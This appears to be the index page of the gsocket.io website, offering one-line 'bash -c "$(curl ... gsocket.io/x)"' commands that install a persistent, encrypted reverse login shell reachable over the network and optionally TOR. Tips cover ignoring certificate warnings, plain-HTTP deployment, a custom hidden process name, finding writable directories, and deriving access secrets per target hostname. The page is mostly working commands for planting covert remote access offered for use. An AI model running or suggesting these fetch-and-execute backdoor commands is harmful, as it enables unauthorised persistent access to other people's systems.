---
layout: default
---

<h2 align="center">Index -- Test version</h2>

<p class="panel-note2" markdown="1">Deploy a reverse login shell with a *single command* (fully automated) - and access the shell remotely - encrypted - and via TOR if you like.</p>



> _This must be the quickest way to access a system_
>                                                 -- anonymous

Use either one of these two commands to _install_:

<div class="tabs-container">
    <div class="tabs">
        <div class="tab">
            <input type="radio" name="curl-dl" id="curl-dl" class="tab-switch" checked> <!-- "checked" means active tab -->
            <label for="curl-dl" class="tab-label">Curl</label> <!-- This is the tab selector -->
            <div class="tab-content">
                <pre><code class="shell">
                bash -c "$(curl -fsSL gsocket.io/x)"
                </code></pre>
            </div>
        </div>
        <div class="tab">
            <input type="radio" name="wget-dl" id="wget-dl" class="tab-switch"> <!-- "checked" means active tab -->
            <label for="wget-dl" class="tab-label">Wget</label> <!-- This is the tab selector -->
            <div class="tab-content">
                <pre><code class="shell">
                bash -c "$(wget --no-verbose -O- gsocket.io/x)"
                </code></pre>
            </div>
        </div>
    </div>
</div>

Use either one of these two commands to _uninstall_:
```shell
GS_UNDO=1 bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
GS_UNDO=1 bash -c "$(wget --no-verbose -O- gsocket.io/x)"
```

Use either command to _access_ the remote host:
```shell
S="ExampleSecretChangeMe" bash -c "$(curl -fsSL gsocket.io/x)"
```
```shell
S="ExampleSecretChangeMe" bash -c "$(wget --no-verbose -O- gsocket.io/x)"
```

<p class="panel-note2" markdown="1">This is just one of many GSOCKET examples. More on [GitHub]({{site.github.repository_url}}).</p>

{:refdef: style="text-align: center;"}
## Screenshots
{: refdef}
Deploy on a host
{:refdef: style="text-align: center;"}
![Deploy-Example](../assets/images/deploy-example.png)
{: refdef}
Log in to the host from your workstation
{:refdef: style="text-align: center;"}
![Deploy-Login](../assets/images/deploy-login.png)
{: refdef}

{:refdef: style="text-align: center;"}
## Tips & Tricks
{: refdef}

Ignore SSL / Certificate warnings:
```shell
bash -c "$(curl -fsSLk gsocket.io/x)"
```
```shell
bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
```

Deploy with a predefined secret:
```shell
X=ExampleSecretChangeMe bash -c "$(curl -fsSL gsocket.io/x)"
```

Deploy with *curl* and fallback to *wget*:
```shell
command -v curl >/dev/null && bash -c "$(curl -fsSL gsocket.io/x)" || bash -c "$(wget --no-verbose -O- gsocket.io/x)"
```

Deploy with a predefined secret. Try *curl* and fallback to *wget*:
```shell
X=ExampleSecretChangeMe && (command -v curl >/dev/null && X=$X bash -c "$(curl -fsSL gsocket.io/x)" || X=$X bash -c "$(wget --no-verbose -O- gsocket.io/x)")
```
  
Deploy from self-extracting shell-script [deploy-all.sh](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/deploy-all.sh) without fetching any packages and using good old plain HTTP:
```
wget --no-hsts http://nossl.segfault.net/deploy-all.sh && \
bash ./deploy-all.sh
```

Useful environment variables:  

|:---|:---|
|S=|Connect to a system (or use `gs-netcat -s <secret> -il`).|
|X=|Set a predefined secret for the installation (X like in inXstallation).|
|GS_NOINST=1|Only start but without installing (will not survive a reboot).|
|GSOCKET_ARGS=|Use additonal arguments. Most often used to force TOR in combination with S=, e.g. `GSOCKET_ARGS="-T" S=<secret> bash -c "$(curl -fsSLk gsocket.io/x)`.|
|GS_DSTDIR=|Set the installation directory. The default is to pick the most suitable automatically. Use `find . -type d -writable`. |
|GS_URL_BASE=|Use URL for static binaries. The default is https://github.com/hackerschoice/binary/raw/main/gsocket/bin/.|
|GS_OSARCH=|Force architecture. The default is to pick the most suitable automatically.
|GS_DEBUG=1|Verbose output and other debug related settings. Often used together with `GS_DEBUG=1 GS_NOSTART=1 GS_NOINST=1 bash -c "$(curl -fsSL gsocket.io/x)"`.|
|GS_HIDDEN_NAME=|Use a custom hidden process name.|
|TMPDIR=|Use a custom temporary directory. Try TMPDIR=$(pwd)|

If all fails:

Download the static binary from [https://github.com/hackerschoice/binary/tree/main/gsocket/bin](https://github.com/hackerschoice/binary/tree/main/gsocket/bin) (likely [gs-netcat_x86_64-alpine.tar.gz](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz)) and extract and start gs-netcat manually:
```shell
curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
SECRET=$(/bin/gs-netcat -g)
GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
echo "Connect with: gs-netcat -s $SECRET -i" 
```

{:refdef: style="text-align: center;"}
## Advanced Tips & Tricks
{: refdef}

Remembering many secrets from many deployments is cumbersome. It is easier to remember just one MASTER-SEED and derive the SECRET from the target's hostname. The following script generates a secure SECRET based on a single MASTER-SEED and the target's hostname.
```sh
# cut & paste this into your shell on your workstation or add to ~/.bashrc
gssec()
{
    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
    str="${str:0:22}"
    echo "DEPLOY: X=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
    echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
    echo "ACCESS: gs-netcat -s ${str} -i"
}
# Pick a STRONG master seed:
[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
```

```sh
# Generate a SECRET based on the SEED and 'alice.com'
$ gssec alice.com # You only need to know "alice.com" to connect.

# Output from above's command:
DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
```

<p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>



